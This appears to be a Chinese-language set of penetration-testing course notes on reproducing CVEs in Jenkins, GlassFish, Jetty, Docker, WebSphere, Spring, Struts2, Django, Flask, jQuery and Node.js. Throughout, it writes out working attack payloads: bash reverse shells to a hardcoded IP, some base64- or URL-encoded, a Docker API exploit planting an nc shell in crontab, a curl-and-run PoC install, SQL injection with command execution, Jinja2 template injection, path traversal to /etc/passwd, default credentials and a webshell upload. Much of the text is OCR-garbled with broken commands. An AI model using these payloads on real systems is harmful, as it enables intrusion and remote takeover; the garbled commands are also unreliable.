<pre><code>    JBoss AS&lt;=4.x
</code></pre>
<h6 id="3）弱口令-未授权访问"><a href="#3）弱口令-未授权访问" class="headerlink" title="3）弱口令 未授权访问"></a>3）弱口令 未授权访问</h6><p>简介：</p>
<p>​    部署jboss时管理员有时会忽略修改密码导致弱口令，又或者无密码可以直接访问后台导致未授权访问。</p>
<p>影响版本：</p>
<p>​    全版本</p>
<h5 id="3、中间件-Jenkins-CVE"><a href="#3、中间件-Jenkins-CVE" class="headerlink" title="3、中间件-Jenkins-CVE"></a>3、中间件-Jenkins-CVE</h5><p>简介：</p>
<p>​    Jenkins 是一个用 Java 编写的开源自动化工具，是基于Java开发的一种持续集成工具，用于监控持续重复的工作。默认端口:8080</p>
<h6 id="（1）CVE-2017-1000353-远程代码执行漏洞"><a href="#（1）CVE-2017-1000353-远程代码执行漏洞" class="headerlink" title="（1）CVE-2017-1000353  远程代码执行漏洞"></a>（1）CVE-2017-1000353  远程代码执行漏洞</h6><p>简介：</p>
<pre><code>    该漏洞存在于使用HTTP协议的双向通信通道的具体实现代码中，Jenkins利用此通道来接收命令，恶意攻击者可以构造恶意攻击参数远程执行命令，从而获取系统权限，造成数据泄露。
</code></pre>
<p>影响版本：</p>
<pre><code>    所有Jenkins主版本均受到影响(包括&lt;=2.56版本)
    所有Jenkins LTS 均受到影响(包括&lt;=2.46.1版本)
</code></pre>
<h6 id="（2）CVE-2018-1000861-远程命令执行漏洞-（未完成）"><a href="#（2）CVE-2018-1000861-远程命令执行漏洞-（未完成）" class="headerlink" title="（2）CVE-2018-1000861  远程命令执行漏洞 （未完成）"></a>（2）CVE-2018-1000861  远程命令执行漏洞 （未完成）</h6><p>简介：</p>
<pre><code>    jenkins使用Stapler开发，在stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java 中使用的 Stapler Web 框架中存在一个代码执行漏洞，该漏洞允许攻击者通过访问构建特殊的 URL 来调用 Java 对象上的某些方法获取权限。
</code></pre>
<p>影响版本：</p>
<pre><code>    Jenkins主版本 &lt;= 2.153
    Jenkins LTS版本 &lt;= 2.138.3
</code></pre>
<h6 id="3）CVE-2019-100300-远程代码执行漏洞（条件苛刻）"><a href="#3）CVE-2019-100300-远程代码执行漏洞（条件苛刻）" class="headerlink" title="3）CVE-2019-100300  远程代码执行漏洞（条件苛刻）"></a>3）CVE-2019-100300  远程代码执行漏洞（条件苛刻）</h6><p>简介：</p>
<pre><code>    在src/main/java/org/jenkinsci/plugins/scriptsecurity/sandbox/groovy/GroovySandbox.java 中存在一个沙盒绕过漏洞，该漏洞允许能提供沙盒脚本的攻击者在 Jenkins master JVM 上执行任意代码。
</code></pre>
<p>影响版本：</p>
<pre><code>    Pipeline: Declarative 插件 &lt;= 1.3.4
    Pipeline: Groovy 插 件 &lt;= 2.61
    Script Security 插 件 &lt;= 1.49
</code></pre>
<p>该漏洞需要提前知道管理员用户账号和密码才能进行利用，利用价值不高</p>
<h5 id="4、中间件-GlassFish-CVE"><a href="#4、中间件-GlassFish-CVE" class="headerlink" title="4、中间件-GlassFish-CVE"></a>4、中间件-GlassFish-CVE</h5><p>简介：</p>
<pre><code>    GlassFish 是一款强健的商业兼应用服务器，达到产品级质量，可免费用于开发、部署和重新分发。开发者可以免费获得源代码，还可以对代码进行更改。默认端口为4848。
</code></pre>
<h6 id="（1）CVE-2017-1000028-任意文件读取漏洞"><a href="#（1）CVE-2017-1000028-任意文件读取漏洞" class="headerlink" title="（1）CVE-2017-1000028 任意文件读取漏洞"></a>（1）CVE-2017-1000028 任意文件读取漏洞</h6><p>简介：</p>
<pre><code>    Oracle 的 GlassFish Server Open Source Edition 4.1 容易受到经过身份验证和未经身份验证的目录遍历漏洞的攻击，可以通过发出特制的 HTTP GET 请求来利用该漏洞。
</code></pre>
<p>影响版本：</p>
<pre><code>   GlassFish &lt;= 4.1.2
</code></pre>
<h6 id="（2）简单口令-Getshell-（getshell失败）"><a href="#（2）简单口令-Getshell-（getshell失败）" class="headerlink" title="（2）简单口令&amp;Getshell （getshell失败）"></a>（2）简单口令&amp;Getshell （getshell失败）</h6><p>简介：</p>
<p>​    部署Glassfish时管理员有时会忽略修改密码导致弱口令，又或者无密码可以直接访问后台导致未授权访问。</p>
<p>影响版本：</p>
<p>​    全版本 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">附加：主要其实就是Weblogic个人感觉更为常见点，所以对于其他的中间件就没做太过多的收集，都是一些相关CVE，使用搜索引擎也很容易去搜到相关的poc</span><br></pre></td></tr></table></figure>

<h1 id="第61天-服务攻防-中间件安全-CVE复现-K8S-Docker-Jetty-Websphere"><a href="#第61天-服务攻防-中间件安全-CVE复现-K8S-Docker-Jetty-Websphere" class="headerlink" title="第61天 服务攻防-中间件安全&amp;CVE复现&amp;K8S&amp;Docker&amp;Jetty&amp;Websphere"></a>第61天 服务攻防-中间件安全&amp;CVE复现&amp;K8S&amp;Docker&amp;Jetty&amp;Websphere</h1><h4 id="知识点：-41"><a href="#知识点：-41" class="headerlink" title="知识点："></a>知识点：</h4><p>中间件及框架列表：<br>lIS,Apache,Nginx,Tomcat,Docker,Weblogic,JBoos,WebSphere,Jenkins,<br>GlassFish,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Sprng,Flask,jQuery<br>0、中间件-K8s安全<br>1、中间件Jey安全<br>2、中间件-Docker安全<br>3.中间件-WebSphere:安全</p>
<h4 id="章节内容：-7"><a href="#章节内容：-7" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制-弱口令爆破攻击<br>4、安全应用框架特定安全漏洞</p>
<h4 id="前置知识：-10"><a href="#前置知识：-10" class="headerlink" title="前置知识："></a>前置知识：</h4><p>中间件安全侧试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断中间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞<br>应用服务安全测试流程：见图<br>1、判断服务开放情况端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式持定漏洞&amp;未授权&amp;弱口令等</p>
<h4 id="演示案例-3"><a href="#演示案例-3" class="headerlink" title="演示案例"></a>演示案例</h4><p>中间件K8s-搜哈<br>中间件Jety-搜哈<br>中间件Docker-搜哈<br>中间件-WebSphere-搜哈<br>配合下-Fofa_Viewer-搜哈</p>
<p>中间件-K8s-搜哈<br>kubernetest简称k8s,是一个由google开源的，用于自动部暑，扩展和管理容器化应用程序的开源系统。在B站内部，k8s在管理生产级容器和应用服务部署已经有较为广泛和成熟的应用。通过kK8$,可跨多台主机进行容器编排、快速按需扩展容器应用及其资源、对应<br>用实施状况检查、服务发现和负载均衡街等。<br><a href="https://blog.csdn.net/w1590191166/article/details/122028001">https://blog.csdn.net/w1590191166/article/details/122028001</a></p>
<p>中间件Jetty-搜哈<br>Elipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。<br>CVE-2021-28164<br><a href="http://123.58.236.76.63126/WEB-INF/web.Xxml">http://123.58.236.76.63126/%2e/WEB-INF/web.Xxml</a><br>CVE-2021-28169<br><a href="http://123.58.236.76:63126/static?/WEB-INF/web.xml">http://123.58.236.76:63126/static?/WEB-INF/web.xml</a><br>CVE-2021-34429<br>http:&#x2F;123.58.236.76:63126&#x2F;%u002eWEB-NF&#x2F;web.xml</p>
<p>中间件-Docker-搜哈<br>Docker容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行POC或EXP,就可以返回一个宿主机的高权限Shll,并拿到宿主机的root权限，可以直接操作宿主机文件。它从容器中逃了出来，因此我们形象的称为Dockeri逃逸漏洞。<br>1、容器判断：判断当前是否是容器环境<br>-是否存在.dockerenv文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Is -alh /.dockerenv</span><br></pre></td></tr></table></figure>

<p>查间系统进程的cgroup信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>

<p>2、容器逃逸漏洞：权限提升<br>-由两核漏洞引起一DirtyC0W(CVE-2016-5195)<br>-由Docker软件设计引起CVE-2019-5736、CVE-2019-14271,CVE-2020-15257<br>由配置不当引起一开启privileged（特权模式）+宿主机目录挂载（文件挂载）、功能<br>(capabilities)机制、sock通信方式<br>CVE-2016-5195<br><a href="https://github.com/gebl/dirtycow-docker-vdso">https://github.com/gebl/dirtycow-docker-vdso</a><br><a href="https://www.ichunqiu.com/experiment/catalog?id=100295">https://www.ichunqiu.com/experiment/catalog?id=100295</a><br>第一步、启动容器：<br>#使用本地1234端口连接docker的1234端口运行dirtycow镜像，并将其临时命名为test<br>#其中test:为临时名称，可以自定义填写。p:第一个端口为本机的端口，第二个端口<br>为Docker的端口。-td:意思是在后台运行，交互式运行，并且输出当前的信息<br>bin&#x2F;bash:调用Shel</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name=test-p 1234:1234 -itd dirtycow /bin/bash</span><br></pre></td></tr></table></figure>

<p>第二部、进入容器：<br>#进入镜像内部</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec-it test /bin/bash</span><br></pre></td></tr></table></figure>

<p>第三步、<br>#编译并运行POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /dirtycow-vdso/</span><br><span class="line">make</span><br><span class="line">/0xdeadbeef</span><br></pre></td></tr></table></figure>

<p>执行操作即可作用宿主机</p>
<p>-CVE-2019-5736<br>参考：https:&#x2F;&#x2F;&#x2F;blog.51cto.com&#x2F;u_15060465&#x2F;4336524<br>复现：curl<br><a href="https://aist_githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw">https://aist_githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw</a> -o<br>install.sh &amp;bash install.sh<br>1、下载POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Frichetten/CVE-2019-5736-PoC</span><br></pre></td></tr></table></figure>

<p>2、修改编译生成payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>

<p>2、修改编译生成payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>


<p>3.将该payload拷贝到docker容器中（此时可以模拟攻击者获取了docker容器权限，在容器<br>中上传payload进行dockeri逃逸）并执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp main ecca872da49d:/home</span><br><span class="line">docker exec-it ecca872da49d bash</span><br><span class="line">cd /home/</span><br><span class="line">chmod 777 main</span><br><span class="line">/main</span><br></pre></td></tr></table></figure>

<p>4、再次进入docker镜像后监听即可收到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec-t镜像ID bash</span><br><span class="line">nc -lwvp</span><br></pre></td></tr></table></figure>

<p>3、容器安全漏洞<br>docker未授权访问漏洞-vulhub-exp.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import docker</span><br><span class="line">client docker.DockerClient(base_url=&#x27;http://IP:2375/)</span><br><span class="line">data=client.containers.run(alpine:latest&#x27;,r&quot;sh-c&quot;echousr/bin/nc反弹IP端☐-e</span><br><span class="line">bin/sh&#x27;&gt;&gt;/tmp/etc/crontabs/root&quot;&quot;,remove=True,volumes=f/etc&quot;:(bind&#x27;:&#x27;/tmp/etc&#x27;,</span><br><span class="line">&#x27;mode&#x27;:&#x27;nw)))</span><br></pre></td></tr></table></figure>

<p>中间件-WebSphere-搜哈<br>WebSphere@Application Server加速交付新应用程序和服务，它可以通过快速交付创新<br>的应用程序来帮助企业提供丰富的用户体验从基于开放标准的丰富的编程模型中进行选<br>择，以便更好地协调项目需求与编程模型功能和开发人员技能。<br>端口：9080一web(http)应用访问端口、9443-web(https)应用访i问端口、9060一管理后台<br>访问端口、9043一管理控制台安全端口、8880一SOAP连接器端口等等。<br>漏洞探测在8880满口，后台是9060端口，解析是9080端口<br>拉取镜像：docker pull iscrosales&#x2F;websphere7<br>启动镜像：docker run-d-p9060:9060-p9043:9043-p8880:8880-p9080:9080<br>iscrosales&#x2F;websphere7<br>停止镜像：docker stop $(docker ps-aq)<br>1、CVE-2015-7450反序列化<br>工具搜哈：<a href="http://147.94.236.117:8880/">http://147.94.236.117:8880/</a><br>2、弱☐令上传拿Shell<br>-在6x至7.0版本，后台登陆只需要输入admin作为用户标识，无需密码，即可登陆后台。<br>-websphere&#x2F;websphere<br>-system&#x2F;manager<br>访i问：http:147.94.236.117:9060&#x2F;<br>登录：admin<br>上传：war马<br>启动：1_war<br>连接：<a href="http://47.94.236.117:9080/1/1jsp">http://47.94.236.117:9080/1/1jsp</a><br>3、CVE-2020-4450:无利用P0C&#x2F;EXP</p>
<h1 id="第62天-服务攻防-框架安全-CVE复现-Spring-Struts-Laravela-ThinkPHP"><a href="#第62天-服务攻防-框架安全-CVE复现-Spring-Struts-Laravela-ThinkPHP" class="headerlink" title="第62天 服务攻防-框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravela&amp;ThinkPHP"></a>第62天 服务攻防-框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravela&amp;ThinkPHP</h1><h4 id="知识点：-42"><a href="#知识点：-42" class="headerlink" title="知识点："></a>知识点：</h4><p>中间件及框架列表：<br>IIS,Apache,Nginx,Tomcat,Docker,K8s,Weblogic.JBoos,WebSphere,<br>Jenkins,GlassFish,Jetty,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Spring,<br>Flask,jQuery等<br>1、开发框架-PHP-Laravel-Thinkphp<br>2、开发框架-Javaweb-St2-Spring<br>3.开发框架-Python-django-Flask<br>4、开发框架-Javascript-Node.js-JQuery</p>
<h4 id="常见语言开发框架："><a href="#常见语言开发框架：" class="headerlink" title="常见语言开发框架："></a>常见语言开发框架：</h4><p>PHP:Thinkphp Laravel YIl Codelgniter CakePHP Zend<br>JAVA:Spring MyBatis Hibernate Struts2 Springboot<br>Python:Django Flask Bottle Turbobars Tornado Web2py<br>Javascript:Vue.js Node.js Bootstrap JQuery Angular</p>
<h4 id="章节内容：-8"><a href="#章节内容：-8" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制弱口令爆破攻击<br>4、安全应用-框架特定安全漏洞</p>
<h4 id="前置知识：-11"><a href="#前置知识：-11" class="headerlink" title="前置知识："></a>前置知识：</h4><p>,中间件安全测试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断中间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p>
<p>应用服务安全测试流程：见图<br>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式特定漏洞&amp;未授权&amp;弱口令等</p>
<p>开发框架组件安全测试流程：<br>1、判断常见语言开发框架类型<br>2、判断开发框架存在的CVE问题<br>3、判断开发框架CVE漏洞利用方式</p>
<h4 id="演示案例：-36"><a href="#演示案例：-36" class="headerlink" title="演示案例："></a>演示案例：</h4><p>PHP-开发框架安全-Thinkphp&amp;Laravel<br>JAVAWEB-开发框架安全-Spring&amp;Struts2</p>
<h5 id="PHP-开发框架安全-Thinkphp-Laravel"><a href="#PHP-开发框架安全-Thinkphp-Laravel" class="headerlink" title="PHP-开发框架安全-Thinkphp&amp;Laravel"></a>PHP-开发框架安全-Thinkphp&amp;Laravel</h5><p>-Laravel是一套简洁、优雅的PHP Web开发框架PHP Web Framework).<br>CVE-2021-3129RCE<br>Laravel &lt;8.4.2<br><a href="https://github.com/zhzyker/CVE-2021-3129">https://github.com/zhzyker/CVE-2021-3129</a><br><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a><br>漏洞复现：<br>使用exp一步Thinkphp-3.X RCE-5.X RCE 脚本小子上线<br>ThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架<br>武器库-Thinkphp专检写入shell，使用哥斯拉连接</p>
<h5 id="JAVAWEB-开发框架安全-Spring-Struts2"><a href="#JAVAWEB-开发框架安全-Spring-Struts2" class="headerlink" title="JAVAWEB-开发框架安全-Spring&amp;Struts2"></a>JAVAWEB-开发框架安全-Spring&amp;Struts2</h5><p>Struts:2是一个基于MvC设计模式的Web应用框架</p>
<h6 id="1、2020前漏洞-复现"><a href="#1、2020前漏洞-复现" class="headerlink" title="1、2020前漏洞 复现"></a>1、2020前漏洞 复现</h6><p>武器库-S2专检</p>
<h6 id="2、cve-2020-17530-复现"><a href="#2、cve-2020-17530-复现" class="headerlink" title="2、cve_2020_17530 复现"></a>2、cve_2020_17530 复现</h6><p>脚本：<a href="https://github.com/YanMu.2020/s2-062">https://github.com/YanMu.2020/s2-062</a><br>手工：</p>
<h6 id="3、cve2021-31805"><a href="#3、cve2021-31805" class="headerlink" title="3、cve2021_31805"></a>3、cve2021_31805</h6><p><a href="https://github.com/YanMu2020/s2-062">https://github.com/YanMu2020/s2-062</a></p>
<h5 id="Spring框架是由于软件开发始的复杂性而创建的。"><a href="#Spring框架是由于软件开发始的复杂性而创建的。" class="headerlink" title="Spring框架是由于软件开发始的复杂性而创建的。"></a>Spring框架是由于软件开发始的复杂性而创建的。</h5><h6 id="1-cve-2017-4971-Spring-Web-Flow-vulfocus"><a href="#1-cve-2017-4971-Spring-Web-Flow-vulfocus" class="headerlink" title="1,cve_2017_4971-Spring Web Flow vulfocus"></a>1,cve_2017_4971-Spring Web Flow vulfocus</h6><p>Spring WebFlow 2.4.0-2.4.4<br><a href="https://paper.seebug.org/322/">https://paper.seebug.org/322/</a><br>_eventld_confirm&#x3D;&amp;csrf&#x3D;e06e1d86-e083-45f7-<br>b700-567b5f7f5d30&amp;(new+java.lang.ProcessBuilder(“bash”,“-c”,”bash±<br>i+&gt;%26+&#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566+0&gt;%261).stat0&#x3D;vulhub</p>
<h6 id="2-cve-2018-1273-Spring-Data-Commons-vulfocus"><a href="#2-cve-2018-1273-Spring-Data-Commons-vulfocus" class="headerlink" title="2.cve_2018_1273-Spring Data Commons vulfocus"></a>2.cve_2018_1273-Spring Data Commons vulfocus</h6><p>Spring Data Commons 1.13-1.13.10 (Ingalls SR10)<br>Spring Data REST 2.6-2.6.10(Ingalls SR10)<br>Spring Data Commons 2.0 to 2.0.5 (Kay SR5<br>Spring Data REST 3.0-3.0.5(Kay SR5）<br>bash-c<br>fecho.YmFzaCAtaSA+JiAvZGV2L3RicC80Ny45NC4yMzYuMTE3LZU1NjYgMD4mMQ&#x3D;&#x3D;<br>base64,-d bash,-i)<br>username#this getclass（）.forName(“java lang.Runtime”).getRuntime(.exec(“%62%61%<br>73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74<br>%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%3<br>0%4e%79%34%35%4e%43%34%79%4d%7a%59%75%4d%54%45%33%4c%7a%55%<br>31%4e%6a%59%67%4d%44%34%6d%4d%51%3d%3d%7d%7c%7b%62%61%73%65<br>%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d”]&#x3D;&amp;passw0rd&#x3D;&amp;<br>repeatedPassword&#x3D;</p>
<h6 id="3、CVE-2022-22963-Spring-Cloud-Function-Spel表达式注入-vulhub"><a href="#3、CVE-2022-22963-Spring-Cloud-Function-Spel表达式注入-vulhub" class="headerlink" title="3、CVE-2022-22963 Spring Cloud Function Spel表达式注入 vulhub"></a>3、CVE-2022-22963 Spring Cloud Function Spel表达式注入 vulhub</h6><p>Spring Cloud Function提供了一个通用的模型，用于在冬种平台上部署基于函数的软件，<br>包括像Amazon AWS Lambda这样的FaaS(函数即服务，function as a service)平台。<br>Connection:close<br>spring cloud.function.routing-expression:T(java.lang.Runtime).getRuntime(.exec(“bash-<br>(echo,YmFzaCAtaSA+JiAVZGV2L3RjcC80Ny45NC4yMzYuMTE3LZU1NjYgMD4mMQ&#x3D;&#x3D;)<br>Kbase64.-d)(bash,-i)”)</p>
<h1 id="第六十三天-服务攻防-框架安全-CVE复现-Django-Flask-Node-JS-JQuery"><a href="#第六十三天-服务攻防-框架安全-CVE复现-Django-Flask-Node-JS-JQuery" class="headerlink" title="第六十三天 服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery"></a>第六十三天 服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery</h1><h4 id="中间件及框架列表："><a href="#中间件及框架列表：" class="headerlink" title="中间件及框架列表："></a>中间件及框架列表：</h4><p>IIS,Apache,Nginx,Tomcat,Docker,K8s,Weblogic.JBoos,WebSphere,<br>Jenkins,GlassFish,Jetty,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Spring,<br>Flask,jQuery等<br>1、开发框架-PHP-Laravel-Thinkphp<br>2、开发框架-Javaweb-St2-Spring<br>3.开发框架-Python-django-Flask<br>4、开发框架-Javascript-Node.js-JQuery<br>5、其他框架Java-Apache Shiro&amp;Apache Sorl</p>
<h4 id="常见语言开发框架：-1"><a href="#常见语言开发框架：-1" class="headerlink" title="常见语言开发框架："></a>常见语言开发框架：</h4><p>PHP:Thinkphp Laravel YIl Codelgniter CakePHP Zend<br>JAVA:Spring MyBatis Hibernate Struts2 Springboot<br>Python:Django Flask Bottle Turbobars Tornado Web2py<br>Javascript:Vue.js Node.js Bootstrap JQuery Angular</p>
<h4 id="章节内容：-9"><a href="#章节内容：-9" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制弱口令爆破攻击<br>4、安全应用-框架特定安全漏洞</p>
<h4 id="前置知识：-12"><a href="#前置知识：-12" class="headerlink" title="前置知识："></a>前置知识：</h4><p>中间件安全测试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断中间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p>
<h5 id="应用服务安全测试流程：见图"><a href="#应用服务安全测试流程：见图" class="headerlink" title="应用服务安全测试流程：见图"></a>应用服务安全测试流程：见图</h5><p>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式特定漏洞&amp;未授权&amp;弱口令等</p>
<h5 id="开发框架组件安全测试流程："><a href="#开发框架组件安全测试流程：" class="headerlink" title="开发框架组件安全测试流程："></a>开发框架组件安全测试流程：</h5><p>1、判断常见语言开发框架类型<br>2、判断开发框架存在的CVE问题<br>3、判断开发框架CVE漏洞利用方式</p>
<h4 id="演示案例：-37"><a href="#演示案例：-37" class="headerlink" title="演示案例："></a>演示案例：</h4><p>Python-开发框架安全-Django&amp;Flask<br>JavaScript-开发框架安全-Jquery&amp;Node</p>
<p>Python-开发框架安全-Diango&amp;Fask</p>
<h5 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h5><p>Django是一款广为流行的开源web框架，由Python编写，许多网站和app都基于Django开<br>发。Django采用了MTV的框架模式，即模型M,视图V和模版T,使用Django,程序员可以<br>方便、快捷地创建高品质、易维护、数据库驱动的应用程序。而且Django还包含许多功能<br>强大的第三方插件，使得Django.具有较强的可扩展性。<br>1、Cve_201914234 需要登录到后台<br>访问下面的路径，单引号已注入成功，SQL语句报错：<br>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail_a%27b&#x3D;123<br>创建cmd exec:<br>admin&#x2F;vuln&#x2F;collection&#x2F;?detail title%27)%3d%271%27%200r%201%3d1%20%3bcreate<br>%20table%20cmd_exec(cmd_output%20text)-%20<br>调用cmd_exec执行命令：<br>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail title%27)%3d%271%27%20or%201%3d1%20%3bcopy%<br>20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz dnslog.cn%27–%20<br>2、CVE-2021-35042 vulfocus<br>&#x2F;vuln&#x2F;?order&#x3D;vuln collection name)select%20updatexml(1,%20concat(0x7e,<br>select%20@@basedir)),1)%23<br>&#x2F;vuln&#x2F;?order&#x3D;vuln collection.name)select%20updatexml(1.%20concat(Ox7e,<br>(select%20version（）)).1)%23<br>数i据库名：vuln&#x2F;?order-vuln collection.name)select%20 updatexml1,%20 concat(0x7e,<br>select%20database（）).1)%23<br>3、CVe-2022-28346<br><a href="https://github.com/YouGina/CVE-2022-28346">https://github.com/YouGina/CVE-2022-28346</a></p>
<h5 id="Flask-Jinja2-SSTI"><a href="#Flask-Jinja2-SSTI" class="headerlink" title="Flask Jinja2 SSTI"></a>Flask Jinja2 SSTI</h5><p>Flask是一个使用Pythons编写的轻量级Web应用框架。其WSGl工具箱采用Verkzeug,模<br>板引擎则使用Jinja2 vulhub<br>?name&#x3D;%7B%25%20for%20c%20in%20%5B%5D.class_base_subclasses_<br>()<br>%20%25%7D%0A%7B%25%20if%20c.name %20%3D%3D%20%27catch_warning<br>s%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.init__globals<br>values（）</p>
<p>JavaScript-开发框架安全-Jquery&amp;Node</p>
<h5 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h5><p>1、cve_2018_9207cve20189208cve20189209<br>描述jQuery是一个快速、简洁的JavaScript框架，是继Prototype,之后又一个优秀的<br>JavaScript代码库（框架）于2006年1月由John Resig发布。<br>jQuery Upload File&lt;&#x3D;4.0.2中的任意文件上传<br>curl -F “myfile&#x3D;@php.php”“<a href="http://123.58.236.76:56579/jquery-upload-">http://123.58.236.76:56579/jquery-upload-</a><br>file&#x2F;php&#x2F;upload.php”</p>
<h5 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h5><p>1、Cve202121315 vulfocus<br>Node.js:是一个基于Chrome V8引擎的JavaScripti运行环境，用于方便的培建响应速度快<br>易于拓展的网络应用。<br>Node.js-systeminformation是用于获取各种系统信息的Node.js模块在存在命令注入漏同的<br>版本中，攻击者可以通过未过滤的参数中注入payloadi执行系统命令。<br>Systeminformation&lt;5.3.1<br>git clone <a href="https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git">https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git</a><br>node index.js<br>&#x2F;api&#x2F;getServices?name&#x3D;$(echo -e ‘xiaodi’&gt;test.txt)<br>2、cve201714849 vulfocus<br>GET:<br>&#x2F;static&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;etc&#x2F;passwd</p>
<h1 id="第六十四天-服务攻防-框架安全-CVE复现Apache-shiro-Apache-Solr"><a href="#第六十四天-服务攻防-框架安全-CVE复现Apache-shiro-Apache-Solr" class="headerlink" title="第六十四天 服务攻防-框架安全&amp;CVE复现Apache shiro&amp;Apache Solr"></a>第六十四天 服务攻防-框架安全&amp;CVE复现Apache shiro&amp;Apache Solr</h1><h4 id="知识点：-43"><a href="#知识点：-43" class="headerlink" title="#知识点："></a>#知识点：</h4><p>中间件及框架列表：<br>IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等<br>1、开发框架-PHP-Laravel-Thinkphp<br>2、开发框架-Javaweb-St2-Spring<br>3、开发框架-Python-django-Flask<br>4、开发框架-Javascript-Node.js-JQuery<br>5、其他框架-Java-Apache Shiro&amp;Apache Sorl</p>
<p>常见语言开发框架：</p>
<p>PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等<br>JAVA：Spring MyBatis Hibernate Struts2 Springboot等<br>Python：Django Flask Bottle Turbobars Tornado Web2py等<br>Javascript：Vue.js Node.js Bootstrap JQuery Angular等</p>
<h4 id="章节内容：-10"><a href="#章节内容：-10" class="headerlink" title="#章节内容："></a>#章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制-特定安全漏洞<br>3、安全机制-弱口令爆破攻击<br>4、安全应用-框架特定安全漏洞</p>
<h4 id="前置知识：-13"><a href="#前置知识：-13" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>-中间件安全测试流程：<br>1、判断中间件信息-名称&amp;版本&amp;三方<br>2、判断中间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p>
<p>-应用服务安全测试流程：见图<br>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p>
<p>-开发框架组件安全测试流程：<br>1、判断常见语言开发框架类型<br>2、判断开发框架存在的CVE问题<br>3、判断开发框架CVE漏洞利用方式</p>
<ul>
<li><h4 id="ApacheShiro-组件框架安全"><a href="#ApacheShiro-组件框架安全" class="headerlink" title="ApacheShiro-组件框架安全"></a>ApacheShiro-组件框架安全</h4></li>
</ul>
